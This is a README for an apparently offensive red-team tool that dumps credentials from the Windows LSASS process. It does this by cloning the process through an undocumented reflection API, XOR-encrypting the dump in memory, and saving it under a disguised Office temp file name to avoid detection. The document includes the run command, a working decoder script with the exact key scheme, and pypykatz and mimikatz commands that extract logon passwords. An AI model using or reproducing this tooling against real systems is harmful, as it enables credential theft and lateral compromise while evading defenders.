# LsassReflectDumping

**Purpose:** Dump LSASS credentials via process reflection — serves Phase 2 (Credential Access) of the IIS apppool escalation path (T1003.001).

## Overview

Instead of the classic `OpenProcess(lsass.exe) → MiniDumpWriteDump` pattern, this tool forks LSASS via the undocumented `RtlCreateProcessReflection` API, creating a suspended clone under a new PID, then dumps the clone rather than LSASS itself. The entire minidump is captured in-memory through a `MINIDUMP_CALLBACK_INFORMATION` callback before being XOR-encrypted in-place with a linear position-dependent key — no MDMP magic bytes or credential strings reach disk. Output flushes to `%TEMP%\~DFxxxx.tmp` (MS Office temp naming), and the path is printed to stdout for the operator to retrieve.

## Target context

- **Host / OS / arch:** IIS01 — Windows Server 2022, x64
- **Privilege required:** SYSTEM or Administrator (elevated token)

## Usage

```powershell
# ☣️ Requires elevated session — dumps credential material
.\ReflectDump.exe
# stdout: C:\Users\<user>\AppData\Local\Temp\~DFA1B2.tmp
```

Decrypt offline with the shared XOR decoder (same scheme as NtdsRawDump and CWLHerpaderping):

```python
import sys
data = open(sys.argv[1], 'rb').read()
open('lsass.dmp', 'wb').write(
    bytes(b ^ ((0xA3 + i * 0x5B) & 0xFF) for i, b in enumerate(data))
)
```

Parse offline — no network required:

```bash
pypykatz lsa minidump lsass.dmp

# or via Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

## See also

- Build: `Build.md`  ·  Code flow & ATT&CK mapping: `Flow.md`
